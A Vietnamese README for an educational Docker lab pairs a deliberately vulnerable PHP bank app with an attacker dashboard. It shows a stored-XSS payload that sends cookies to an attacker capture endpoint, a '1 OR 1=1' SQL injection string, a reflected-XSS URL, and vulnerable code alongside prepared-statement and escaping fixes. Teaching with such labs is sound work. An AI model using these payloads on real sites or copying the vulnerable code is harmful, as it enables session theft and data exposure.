# XSS and SQL Injection Attack - Dự Án Demo

## 📋 Mục Đích Dự Án

Đây là một dự án giáo dục được thiết kế để thực hành và hiểu rõ hơn về hai loại lỗ hổng bảo mật phổ biến nhất:

1. **Cross-Site Scripting (XSS)** - Kỹ thuật tiêm mã JavaScript vào trang web
2. **SQL Injection** - Kỹ thuật tấn công cơ sở dữ liệu thông qua các truy vấn SQL độc hại

## ⚠️ Cảnh Báo Bảo Mật

**Dự án này chỉ được sử dụng cho mục đích giáo dục và đào tạo.** Không được sử dụng để tấn công các hệ thống không có quyền. Vui lòng tuân theo các quy định pháp luật địa phương.

## 🏗️ Cấu Trúc Dự Án

```
xss-and-sql-injection-attack/
├── vulnerable-bank/          # Ứng dụng Ngân hàng có lỗ hổng
│   ├── index.php            # Trang đăng nhập
│   ├── dashboard.php        # Bảng điều khiển người dùng
│   ├── profile.php          # Trang hồ sơ (XSS vulnerability)
│   ├── transfer.php         # Trang chuyển tiền (SQL Injection vulnerability)
│   ├── cards.php            # Quản lý thẻ ảo
│   ├── loans.php            # Quản lý khoản vay
│   ├── bills.php            # Quản lý hóa đơn
│   ├── db.php               # Kết nối cơ sở dữ liệu
│   ├── functions.php        # Các hàm hỗ trợ
│   ├── setup.sql            # Script khởi tạo cơ sở dữ liệu
│   ├── docker-compose.yml   # Cấu hình Docker
│   ├── Dockerfile           # Dockerfile cho ứng dụng
│   └── css/                 # Các file CSS
├── attacker/                # Ứng dụng Tấn công
│   ├── index.php            # Dashboard tấn công
│   ├── capture.php          # Capture dữ liệu bị đánh cắp
│   ├── get_logs.php         # Xem nhật ký tấn công
│   └── Dockerfile           # Dockerfile cho attacker app
└── README.md               # Tài liệu này
```

## 🚀 Yêu Cầu Hệ Thống

- **Docker** (phiên bản 20.10+)
- **Docker Compose** (phiên bản 1.29+)
- **Web browser** (Chrome, Firefox, Safari, Edge)

## 📦 Cài Đặt và Chạy

### 1. Clone hoặc tải dự án

```bash
cd /path/to/xss-and-sql-injection-attack
```

### 2. Khởi động các container Docker

```bash
cd vulnerable-bank
docker-compose up
```

Lệnh này sẽ:
- Tải các image MySQL, PHP, PHPMyAdmin
- Khởi tạo cơ sở dữ liệu `vulnerable_bank`
- Chạy các ứng dụng web

### 3. Truy cập ứng dụng

Sau khi containers khởi động thành công, truy cập:

| Dịch vụ | URL | Tài khoản | Mật khẩu |
|---------|-----|----------|---------|
| Ngân hàng dễ bị tấn công | http://localhost:8080 | user1 | password123 |
| PHPMyAdmin | http://localhost:8081 | root | root |
| Dashboard Attacker | http://localhost:8082 | - | - |

## 🔑 Tài Khoản Mặc Định

Các tài khoản được tạo sẵn:

| Username | Password | Balance |
|----------|----------|---------|
| user1 | password123 | $5000 |
| user2 | password456 | $3000 |
| user3 | password789 | $2000 |

## 🎯 Các Loại Lỗ Hổng Có Thể Khai Thác

### 1. **Cross-Site Scripting (XSS) - Stored**

**Vị trí:** Trang Profile (`profile.php`)

**Cách khai thác:**
1. Đăng nhập vào tài khoản
2. Vào trang Profile
3. Nhập mã JavaScript vào trường "Bio":
   ```javascript
   <script>
   fetch('http://localhost:8082/capture.php?data=' + 
         encodeURIComponent(document.cookie))
   </script>
   ```
4. Khi người dùng khác xem profile, cookies sẽ bị gửi tới attacker

**Mục đích học tập:** Hiểu cách mã độc được lưu trữ và tái hiện

### 2. **SQL Injection**

**Vị trí:** Trang Chuyển tiền (`transfer.php`)

**Cách khai thác:**
1. Đăng nhập vào tài khoản
2. Vào trang Transfer Money
3. Nhập vào trường "To User ID":
   ```sql
   1 OR 1=1 --
   ```
4. Hệ thống sẽ hiện tất cả người dùng thay vì người dùng cụ thể

**Mục đích học tập:** Hiểu cách mã SQL không an toàn có thể bị khai thác

### 3. **XSS - Reflected**

**Vị trí:** Các tham số URL

**Cách khai thác:**
```
http://localhost:8080/dashboard.php?error=<script>alert('XSS')</script>
```

## 📊 Ứng Dụng Attacker

Dashboard Attacker (port 8082) hiển thị:
- Cookies bị đánh cắp từ các nạn nhân
- Dữ liệu được gửi qua XSS
- Nhật ký các tấn công thành công

## 🛠️ Cấu Trúc Cơ Sở Dữ Liệu

### Table: users
```sql
- id: INT (Primary Key)
- username: VARCHAR(50)
- password: VARCHAR(255)
- balance: DECIMAL(10,2)
- profile_bio: TEXT (XSS vulnerable)
```

### Table: transactions
```sql
- id: INT (Primary Key)
- user_id: INT (Foreign Key)
- type: ENUM('credit', 'debit')
- description: TEXT
- amount: DECIMAL(10,2)
- created_at: TIMESTAMP
```

### Table: virtual_cards
```sql
- id: INT (Primary Key)
- user_id: INT (Foreign Key)
- card_number: VARCHAR(16)
- expiry: VARCHAR(5)
- cvv: VARCHAR(3)
- balance: DECIMAL(10,2)
```

### Table: loans
```sql
- id: INT (Primary Key)
- user_id: INT (Foreign Key)
- amount: DECIMAL(10,2)
- status: ENUM('pending', 'approved', 'rejected')
- created_at: TIMESTAMP
```

### Table: bills
```sql
- id: INT (Primary Key)
- user_id: INT (Foreign Key)
- category: VARCHAR(50)
- biller: VARCHAR(100)
- amount: DECIMAL(10,2)
- status: ENUM('pending', 'paid')
```

## 🔍 Phân Tích Các Lỗ Hổng

### Vị trí Vulnerable Code:

**File: `vulnerable-bank/functions.php`**
```php
function get_user_data($conn, $user_id) {
    // VULNERABLE: Không sử dụng prepared statements
    $sql = "SELECT * FROM users WHERE id = $user_id";
    $result = $conn->query($sql);
    return $result->fetch_assoc();
}
```

**File: `vulnerable-bank/profile.php`**
```php
// VULNERABLE: XSS - hiển thị user input mà không escape
echo $user['profile_bio'];
```

## 🛡️ Cách Bảo Vệ

### Phòng Chống SQL Injection:
```php
// Sử dụng Prepared Statements
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $user_id);
$stmt->execute();
$result = $stmt->get_result();
```

### Phòng Chống XSS:
```php
// Sử dụng htmlspecialchars() hoặc htmlentities()
echo htmlspecialchars($user['profile_bio'], ENT_QUOTES, 'UTF-8');
```

## 📝 Bài Tập Thực Hành

### Bài 1: Tìm tất cả người dùng bằng SQL Injection
- Mục đích: Hiểu cách SQL injection hoạt động
- Mức độ: Dễ

### Bài 2: Đánh cắp cookies bằng XSS Stored
- Mục đích: Hiểu cách XSS có thể đánh cắp dữ liệu
- Mức độ: Trung bình

### Bài 3: Nâng cao quyền tài khoản
- Mục đích: Kết hợp XSS và SQL Injection
- Mức độ: Khó

## 🐛 Troubleshooting

### Containers không khởi động

```bash
# Kiểm tra logs
docker-compose logs

# Dừng tất cả containers
docker-compose down

# Xóa volumes và khởi động lại
docker-compose down -v
docker-compose up --build
```

### Port đã được sử dụng

```bash
# Tìm process sử dụng port
lsof -i :8080
lsof -i :8081
lsof -i :8082

# Hoặc sửa port trong docker-compose.yml
```

### Kết nối MySQL không thành công

```bash
# Kiểm tra các container đang chạy
docker-compose ps

# Kiểm tra logs MySQL
docker-compose logs mysql_db
```

## 📚 Tài Liệu Tham Khảo

- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PHP Security](https://www.php.net/manual/en/security.php)
- [Docker Documentation](https://docs.docker.com/)

## 🤝 Đóng Góp

Để báo cáo bug hoặc đề xuất cải thiện, vui lòng tạo một issue.

## 📄 Giấy Phép

Dự án này được cấp phép dưới MIT License - xem file LICENSE để chi tiết.

## 👨‍💻 Tác Giả

Dự án giáo dục về XSS và SQL Injection

---

**Ghi chú:** Hãy luôn nhớ rằng các kiến thức về bảo mật này chỉ nên được sử dụng để bảo vệ hệ thống, không để tấn công các hệ thống trái phép.
